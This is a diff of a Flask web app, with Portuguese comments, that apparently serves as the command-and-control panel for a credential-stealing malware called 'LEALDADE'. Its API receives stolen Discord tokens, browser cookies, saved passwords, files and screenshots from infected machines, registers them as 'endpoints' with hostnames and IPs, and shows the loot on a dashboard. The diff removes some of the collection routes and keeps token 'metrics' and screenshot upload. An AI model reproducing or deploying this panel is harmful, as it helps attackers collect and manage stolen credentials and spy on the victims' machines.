@@ -33,8 +33,7 @@ full_reports = {}
 uploaded_files = {}
 
 # Template HTML robusto
-HTML_TEMPLATE = """
-<!DOCTYPE html>
+HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
@@ -406,320 +405,7 @@ HTML_TEMPLATE = """
         }
     </script>
 </body>
-</html>
-"""
-
-# API Endpoints robustos
-@app.route('/')
-def index():
-    """Página de login (principal)"""
-    return LOGIN_TEMPLATE
-
-@app.route('/dashboard')
-def dashboard():
-    """Página principal do dashboard"""
-    return HTML_TEMPLATE.replace('{{UPDATE_TIME}}', datetime.now().strftime('%H:%M:%S'))
-
-@app.route('/api/register', methods=['POST'])
-def register_endpoint():
-    """Registra novo endpoint"""
-    try:
-        data = request.get_json()
-        endpoint_id = data.get('id')
-        
-        if not endpoint_id:
-            return jsonify({'error': 'ID é obrigatório'}), 400
-        
-        endpoints[endpoint_id] = {
-            'id': endpoint_id,
-            'hostname': data.get('hostname', 'Unknown'),
-            'user': data.get('user', 'Unknown'),
-            'ip_address': data.get('ip_address', '0.0.0.0'),
-            'external_ip': data.get('external_ip', '0.0.0.0'),
-            'platform': data.get('platform', 'Unknown'),
-            'ram': data.get('ram', 'Unknown'),
-            'status': 'online',
-            'last_seen': datetime.now().strftime('%H:%M:%S')
-        }
-        
-        return jsonify({'success': True, 'message': 'Endpoint registrado'})
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/endpoints', methods=['GET'])
-def get_endpoints():
-    """Lista todos os endpoints"""
-    return jsonify(list(endpoints.values()))
-
-@app.route('/api/stats', methods=['GET'])
-def get_stats():
-    """Estatísticas gerais"""
-    return jsonify({
-        'total_endpoints': len(endpoints),
-        'online_endpoints': len([e for e in endpoints.values() if e['status'] == 'online']),
-        'total_metrics': len(metrics_data)
-    })
-
-@app.route('/api/metrics', methods=['POST'])
-def receive_metrics():
-    """Recebe métricas de autenticação"""
-    try:
-        data = request.get_json()
-        metrics_data.append({
-            'endpoint_id': data.get('endpoint_id'),
-            'token': data.get('token'),
-            'valid': data.get('valid', False),
-            'account': data.get('account', {}),
-            'source': data.get('source', 'unknown'),
-            'timestamp': datetime.now().isoformat()
-        })
-        return jsonify({'success': True})
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/metrics', methods=['GET'])
-def get_metrics():
-    """Lista todas as métricas"""
-    return jsonify(metrics_data)
-
-@app.route('/api/screenshot/<endpoint_id>', methods=['GET'])
-def get_screenshot(endpoint_id):
-    """Obtém screenshot de um endpoint"""
-    if endpoint_id in endpoint_screenshots:
-        return jsonify(endpoint_screenshots[endpoint_id])
-    return jsonify({'error': 'Screenshot não encontrado'}), 404
-
-@app.route('/api/screenshot', methods=['POST'])
-def upload_screenshot():
-    """Recebe screenshot de um endpoint"""
-    try:
-        data = request.get_json()
-        endpoint_id = data.get('endpoint_id')
-        image_data = data.get('image')
-        
-        if endpoint_id and image_data:
-            endpoint_screenshots[endpoint_id] = {
-                'image': image_data,
-                'timestamp': datetime.now().isoformat()
-            }
-        return jsonify({'success': True})
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
-
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=False)
-                Object.entries(tokens).forEach(([endpoint_id, data]) => {
-                    data.tokens.forEach(token => {
-                        const div = document.createElement('div');
-                        div.className = 'token-card';
-                        div.innerHTML = `
-                            <strong>Endpoint:</strong> ${endpoint_id}<br>
-                            <strong>Token:</strong> ${token.token || 'N/A'}<br>
-                            <strong>Válido:</strong> ${token.valid ? '✅' : '❌'}<br>
-                            ${token.account ? `<strong>Usuário:</strong> ${token.account.username}#${token.account.discriminator}<br>` : ''}
-                        `;
-                        tokensList.appendChild(div);
-                    });
-                });
-                
-                if (Object.keys(tokens).length === 0) {
-                    tokensList.innerHTML = '<div class="empty-state">Nenhum token encontrado</div>';
-                }
-            } catch (error) {
-                console.error('Error loading tokens:', error);
-            }
-        }
-
-        async function loadCookies() {
-            try {
-                const response = await fetch('/api/cookies_data');
-                const cookies = await response.json();
-                
-                const contentDiv = document.getElementById('dataContent');
-                contentDiv.innerHTML = '<div class="data-section"><h3>🍪 Cookies do Navegador</h3><div id="cookiesList"></div></div>';
-                
-                const cookiesList = document.getElementById('cookiesList');
-                cookiesList.innerHTML = '';
-                
-                Object.entries(cookies).forEach(([endpoint_id, data]) => {
-                    data.cookies.forEach(cookie => {
-                        const div = document.createElement('div');
-                        div.className = 'cookie-card';
-                        div.innerHTML = `
-                            <strong>Endpoint:</strong> ${endpoint_id}<br>
-                            <strong>Host:</strong> ${cookie.host}<br>
-                            <strong>Nome:</strong> ${cookie.name}<br>
-                            <strong>Valor:</strong> ${cookie.value.substring(0, 100)}${cookie.value.length > 100 ? '...' : ''}<br>
-                        `;
-                        cookiesList.appendChild(div);
-                    });
-                });
-                
-                if (Object.keys(cookies).length === 0) {
-                    cookiesList.innerHTML = '<div class="empty-state">Nenhum cookie encontrado</div>';
-                }
-            } catch (error) {
-                console.error('Error loading cookies:', error);
-            }
-        }
-
-        async function loadPasswords() {
-            try {
-                const response = await fetch('/api/passwords_data');
-                const passwords = await response.json();
-                
-                const contentDiv = document.getElementById('dataContent');
-                contentDiv.innerHTML = '<div class="data-section"><h3>🔒 Senhas Salvas</h3><div id="passwordsList"></div></div>';
-                
-                const passwordsList = document.getElementById('passwordsList');
-                passwordsList.innerHTML = '';
-                
-                Object.entries(passwords).forEach(([endpoint_id, data]) => {
-                    data.passwords.forEach(password => {
-                        const div = document.createElement('div');
-                        div.className = 'password-card';
-                        div.innerHTML = `
-                            <strong>Endpoint:</strong> ${endpoint_id}<br>
-                            <strong>Navegador:</strong> ${password.browser}<br>
-                            <strong>URL:</strong> ${password.url}<br>
-                            <strong>Usuário:</strong> ${password.username}<br>
-                            <strong>Senha:</strong> ${password.password}<br>
-                        `;
-                        passwordsList.appendChild(div);
-                    });
-                });
-                
-                if (Object.keys(passwords).length === 0) {
-                    passwordsList.innerHTML = '<div class="empty-state">Nenhuma senha encontrada</div>';
-                }
-            } catch (error) {
-                console.error('Error loading passwords:', error);
-            }
-        }
-
-        async function loadFiles() {
-            try {
-                const response = await fetch('/api/files_data');
-                const files = await response.json();
-                
-                const contentDiv = document.getElementById('dataContent');
-                contentDiv.innerHTML = '<div class="data-section"><h3>📁 Arquivos Recebidos</h3><div id="filesList"></div></div>';
-                
-                const filesList = document.getElementById('filesList');
-                filesList.innerHTML = '';
-                
-                Object.entries(files).forEach(([endpoint_id, data]) => {
-                    data.files.forEach(file => {
-                        const div = document.createElement('div');
-                        div.className = 'token-card';
-                        div.innerHTML = `
-                            <strong>Endpoint:</strong> ${endpoint_id}<br>
-                            <strong>Nome:</strong> ${file.name || file.filename}<br>
-                            <strong>Tamanho:</strong> ${file.size ? (file.size / 1024).toFixed(2) + ' KB' : 'N/A'}<br>
-                            <strong>Tipo:</strong> ${file.type || file.content_type}<br>
-                        `;
-                        filesList.appendChild(div);
-                    });
-                });
-                
-                if (Object.keys(files).length === 0) {
-                    filesList.innerHTML = '<div class="empty-state">Nenhum arquivo encontrado</div>';
-                }
-            } catch (error) {
-                console.error('Error loading files:', error);
-            }
-        }
-
-        async function loadScreenshots() {
-            try {
-                const response = await fetch('/api/screenshots');
-                const screenshots = await response.json();
-                
-                const container = document.getElementById('screenContent');
-                container.innerHTML = '';
-                
-                Object.entries(screenshots).forEach(([endpoint_id, screenshot]) => {
-                    const div = document.createElement('div');
-                    div.innerHTML = `
-                        <h3 style="color: #a855f7; margin-bottom: 15px;">${endpoint_id}</h3>
-                        <p style="color: #9ca3af; margin-bottom: 15px;"><strong>Data:</strong> ${new Date(screenshot.timestamp).toLocaleString()}</p>
-                        ${screenshot.image ? `<img src="data:image/png;base64,${screenshot.image}" class="screenshot-img" alt="Screenshot">` : ''}
-                    `;
-                    container.appendChild(div);
-                });
-                
-                document.getElementById('totalScreenshots').textContent = Object.keys(screenshots).length;
-                
-                if (Object.keys(screenshots).length === 0) {
-                    container.innerHTML = '<div style="color: #6b7280;">Nenhuma screenshot encontrada</div>';
-                }
-            } catch (error) {
-                console.error('Error loading screenshots:', error);
-            }
-        }
-
-        function selectEndpoint() {
-            const select = document.getElementById('endpointSelect');
-            currentEndpoint = select.value;
-            const btn = document.getElementById('screenshotBtn');
-            
-            if (currentEndpoint) {
-                btn.disabled = false;
-                btn.style.opacity = '1';
-            } else {
-                btn.disabled = true;
-                btn.style.opacity = '0.5';
-            }
-        }
-
-        async function requestScreenshot(endpointId) {
-            const id = endpointId || currentEndpoint;
-            if (!id) {
-                alert('Selecione um endpoint primeiro');
-                return;
-            }
-            
-            try {
-                const response = await fetch(`/api/request_screenshot/${id}`, { method: 'POST' });
-                const result = await response.json();
-                
-                if (result.status === 'success') {
-                    alert(`Screenshot solicitado para ${id}!`);
-                    setTimeout(() => {
-                        loadScreenshots();
-                        if (currentEndpoint === id) {
-                            selectEndpoint();
-                        }
-                    }, 5000);
-                } else {
-                    alert(`Erro: ${result.message}`);
-                }
-            } catch (error) {
-                console.error('Error requesting screenshot:', error);
-            }
-        }
-
-        function loadAllData() {
-            loadEndpoints();
-            
-            fetch('/api/metrics_data')
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('totalMetrics').textContent = data.length;
-                })
-                .catch(error => console.error('Error loading metrics:', error));
-        }
-
-        // Carrega dados iniciais
-        loadAllData();
-        
-        // Atualiza a cada 30 segundos
-        setInterval(loadAllData, 30000);
-    </script>
-</body>
-</html>
-"""
+</html>"""
 
 # Template do login roxo/preto premium com animações cinematográficas
 LOGIN_TEMPLATE = """
@@ -728,9 +414,14 @@ LOGIN_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LEALDADE - Portal Exclusivo</title>
+    <title>LEALDADE SYSTEM - Login</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        /* Reset e estilos globais */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -1086,31 +777,22 @@ LOGIN_TEMPLATE = """
     <!-- Container principal -->
     <div class="login-container">
         <div class="logo">
-            <div class="logo-particles" id="logoParticles"></div>
             <h1>LEALDADE</h1>
-            <p>Portal Exclusivo</p>
+            <p>SYSTEM</p>
+            <div class="logo-particles" id="logoParticles"></div>
         </div>
-        
-        <div class="error" id="errorMsg"></div>
-        <div class="success" id="successMsg"></div>
         
         <form id="loginForm">
             <div class="form-group">
-                <label for="username">Usuário</label>
+                <label for="username">USUÁRIO</label>
                 <input type="text" id="username" name="username" placeholder="Digite seu usuário" required>
                 <div class="input-glow"></div>
-                <div class="typing-indicator" id="usernameTyping">
-                    <span></span><span></span><span></span>
-                </div>
             </div>
             
             <div class="form-group">
-                <label for="password">Senha</label>
+                <label for="password">SENHA</label>
                 <input type="password" id="password" name="password" placeholder="Digite sua senha" required>
                 <div class="input-glow"></div>
-                <div class="typing-indicator" id="passwordTyping">
-                    <span></span><span></span><span></span>
-                </div>
             </div>
             
             <button type="submit" class="login-btn" id="loginBtn">
@@ -1234,232 +916,95 @@ def index():
 
 @app.route('/dashboard')
 def dashboard():
-    """Página principal do painel"""
-    return HTML_TEMPLATE
+    """Página principal do dashboard"""
+    return HTML_TEMPLATE.replace('{{UPDATE_TIME}}', datetime.now().strftime('%H:%M:%S'))
 
-@app.route('/api/register', methods=['POST', 'OPTIONS'])
+@app.route('/api/register', methods=['POST'])
 def register_endpoint():
     """Registra novo endpoint"""
-    if request.method == 'OPTIONS':
-        return jsonify({'status': 'success'})
-    
     try:
-        data = request.json
-        endpoint_id = data.get('endpoint_id', 'unknown')
+        data = request.get_json()
+        endpoint_id = data.get('id')
+        
+        if not endpoint_id:
+            return jsonify({'error': 'ID é obrigatório'}), 400
         
         endpoints[endpoint_id] = {
             'id': endpoint_id,
             'hostname': data.get('hostname', 'Unknown'),
             'user': data.get('user', 'Unknown'),
-            'ip_address': data.get('ip_address', 'Unknown'),
-            'external_ip': data.get('external_ip', 'Unknown'),
+            'ip_address': data.get('ip_address', '0.0.0.0'),
+            'external_ip': data.get('external_ip', '0.0.0.0'),
             'platform': data.get('platform', 'Unknown'),
             'ram': data.get('ram', 'Unknown'),
             'status': 'online',
-            'last_seen': datetime.now().isoformat(),
-            'registered_at': datetime.now().isoformat()
+            'last_seen': datetime.now().strftime('%H:%M:%S')
         }
         
-        print(f"[API] Endpoint registrado: {endpoint_id}")
-        return jsonify({'status': 'success'})
+        return jsonify({'success': True, 'message': 'Endpoint registrado'})
     except Exception as e:
-        print(f"[API] Erro ao registrar endpoint: {e}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+        return jsonify({'error': str(e)}), 500
 
-@app.route('/api/tokens_data')
-def get_tokens_data():
-    """Retorna todos os tokens coletados"""
-    return jsonify(endpoint_tokens)
+@app.route('/api/endpoints', methods=['GET'])
+def get_endpoints():
+    """Lista todos os endpoints"""
+    return jsonify(list(endpoints.values()))
 
-@app.route('/api/cookies_data')
-def get_cookies_data():
-    """Retorna todos os cookies coletados"""
-    return jsonify(endpoint_cookies)
-
-@app.route('/api/passwords_data')
-def get_passwords_data():
-    """Retorna todas as senhas coletadas"""
-    return jsonify(endpoint_passwords)
-
-@app.route('/api/files_data')
-def get_files_data():
-    """Retorna todos os arquivos recebidos"""
-    return jsonify(endpoint_files)
-
-@app.route('/api/metrics_data')
-def get_metrics_data():
-    """Retorna todas as métricas"""
-    return jsonify(metrics_data)
-
-@app.route('/api/tokens', methods=['POST'])
-def receive_tokens():
-    """Recebe tokens de um endpoint"""
-    try:
-        data = request.json
-        endpoint_id = data.get('endpoint_id', 'unknown')
-        tokens = data.get('tokens', [])
-        
-        if endpoint_id:
-            endpoint_tokens[endpoint_id] = {
-                'tokens': tokens,
-                'timestamp': datetime.now().isoformat()
-            }
-            print(f"[API] Tokens recebidos: {endpoint_id} - {len(tokens)} tokens")
-            return jsonify({'status': 'success'})
-    except Exception as e:
-        print(f"[API] Erro ao receber tokens: {e}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
-
-@app.route('/api/cookies', methods=['POST'])
-def receive_cookies():
-    """Recebe cookies de um endpoint"""
-    try:
-        data = request.json
-        endpoint_id = data.get('endpoint_id', 'unknown')
-        cookies = data.get('cookies', [])
-        
-        if endpoint_id:
-            endpoint_cookies[endpoint_id] = {
-                'cookies': cookies,
-                'timestamp': datetime.now().isoformat()
-            }
-            print(f"[API] Cookies recebidos: {endpoint_id} - {len(cookies)} cookies")
-            return jsonify({'status': 'success'})
-    except Exception as e:
-        print(f"[API] Erro ao receber cookies: {e}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
-
-@app.route('/api/passwords', methods=['POST'])
-def receive_passwords():
-    """Recebe senhas de um endpoint"""
-    try:
-        data = request.json
-        endpoint_id = data.get('endpoint_id', 'unknown')
-        passwords = data.get('passwords', [])
-        
-        if endpoint_id:
-            endpoint_passwords[endpoint_id] = {
-                'passwords': passwords,
-                'timestamp': datetime.now().isoformat()
-            }
-            print(f"[API] Senhas recebidas: {endpoint_id} - {len(passwords)} senhas")
-            return jsonify({'status': 'success'})
-    except Exception as e:
-        print(f"[API] Erro ao receber senhas: {e}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
-
-@app.route('/api/files', methods=['POST'])
-def receive_files():
-    """Recebe arquivos de um endpoint"""
-    try:
-        data = request.json
-        endpoint_id = data.get('endpoint_id', 'unknown')
-        files = data.get('files', [])
-        
-        if endpoint_id:
-            endpoint_files[endpoint_id] = {
-                'files': files,
-                'timestamp': datetime.now().isoformat()
-            }
-            print(f"[API] Arquivos recebidos: {endpoint_id} - {len(files)} arquivos")
-            return jsonify({'status': 'success'})
-    except Exception as e:
-        print(f"[API] Erro ao receber arquivos: {e}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+@app.route('/api/stats', methods=['GET'])
+def get_stats():
+    """Estatísticas gerais"""
+    return jsonify({
+        'total_endpoints': len(endpoints),
+        'online_endpoints': len([e for e in endpoints.values() if e['status'] == 'online']),
+        'total_metrics': len(metrics_data)
+    })
 
 @app.route('/api/metrics', methods=['POST'])
 def receive_metrics():
-    """Recebe métricas de um endpoint"""
+    """Recebe métricas de autenticação"""
     try:
-        data = request.json
-        endpoint_id = data.get('endpoint_id', 'unknown')
-        metrics = data.get('metrics', {})
-        
-        if endpoint_id:
-            metrics_data.append({
-                'endpoint_id': endpoint_id,
-                'metrics': metrics,
-                'timestamp': datetime.now().isoformat()
-            })
-            print(f"[API] Métricas recebidas: {endpoint_id}")
-            return jsonify({'status': 'success'})
+        data = request.get_json()
+        metrics_data.append({
+            'endpoint_id': data.get('endpoint_id'),
+            'token': data.get('token'),
+            'valid': data.get('valid', False),
+            'account': data.get('account', {}),
+            'source': data.get('source', 'unknown'),
+            'timestamp': datetime.now().isoformat()
+        })
+        return jsonify({'success': True})
     except Exception as e:
-        print(f"[API] Erro ao receber métricas: {e}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+        return jsonify({'error': str(e)}), 500
 
-@app.route('/api/request_screenshot/<endpoint_id>', methods=['POST'])
-def request_screenshot(endpoint_id):
-    """Solicita screenshot de um endpoint específico"""
+@app.route('/api/metrics', methods=['GET'])
+def get_metrics():
+    """Lista todas as métricas"""
+    return jsonify(metrics_data)
+
+@app.route('/api/screenshot/<endpoint_id>', methods=['GET'])
+def get_screenshot(endpoint_id):
+    """Obtém screenshot de um endpoint"""
+    if endpoint_id in endpoint_screenshots:
+        return jsonify(endpoint_screenshots[endpoint_id])
+    return jsonify({'error': 'Screenshot não encontrado'}), 404
+
+@app.route('/api/screenshot', methods=['POST'])
+def upload_screenshot():
+    """Recebe screenshot de um endpoint"""
     try:
-        if endpoint_id not in screenshot_requests:
-            screenshot_requests[endpoint_id] = {
-                'request_screenshot': True,
+        data = request.get_json()
+        endpoint_id = data.get('endpoint_id')
+        image_data = data.get('image')
+        
+        if endpoint_id and image_data:
+            endpoint_screenshots[endpoint_id] = {
+                'image': image_data,
                 'timestamp': datetime.now().isoformat()
             }
-        print(f"[API] Screenshot solicitado: {endpoint_id}")
-        return jsonify({'status': 'success', 'message': f'Screenshot solicitado para {endpoint_id}'})
-    except Exception as e:
-        print(f"[API] Erro ao solicitar screenshot: {e}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
-
-@app.route('/api/screenshot_requests/<endpoint_id>')
-def check_screenshot_request(endpoint_id):
-    """Verifica se há solicitação de screenshot"""
-    if endpoint_id in screenshot_requests:
-        return jsonify(screenshot_requests[endpoint_id])
-    else:
-        return jsonify({'request_screenshot': False})
-
-@app.route('/api/screenshots')
-def get_screenshots():
-    """Retorna todos os screenshots"""
-    return jsonify(endpoint_screenshots)
-
-@app.route('/api/heartbeat', methods=['POST'])
-def receive_heartbeat():
-    """Recebe heartbeat de um endpoint"""
-    try:
-        data = request.json
-        endpoint_id = data.get('endpoint_id', 'unknown')
-        status = data.get('status', 'unknown')
-        
-        if endpoint_id in endpoints:
-            endpoints[endpoint_id]['last_seen'] = datetime.now().isoformat()
-            endpoints[endpoint_id]['status'] = status
-        
-        print(f"[API] Heartbeat recebido: {endpoint_id} - {status}")
-        return jsonify({'status': 'success'})
-    except Exception as e:
-        print(f"[API] Erro ao receber heartbeat: {e}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
-
-@app.route('/api/endpoints')
-def list_endpoints():
-    """Lista todos os endpoints"""
-    try:
-        endpoints_list = []
-        for ep_id, data in endpoints.items():
-            endpoints_list.append({
-                'id': ep_id,
-                'status': data.get('status', 'unknown'),
-                'last_seen': data.get('last_seen', ''),
-                'hostname': data.get('hostname', ''),
-                'user': data.get('user', ''),
-                'ip_address': data.get('ip_address', ''),
-                'external_ip': data.get('external_ip', ''),
-                'platform': data.get('platform', ''),
-                'ram': data.get('ram', ''),
-                'registered_at': data.get('registered_at', '')
-            })
-        
-        return jsonify(endpoints_list)
+        return jsonify({'success': True})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
 if __name__ == '__main__':
-    print("🚀 Iniciando System Monitor CORRIGIDO para Railway...")
-    print("📡 Servidor robusto sem dependências problemáticas")
-    print("🌐 URL: https://web-production-49d37.up.railway.app")
-    print()
-    
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)
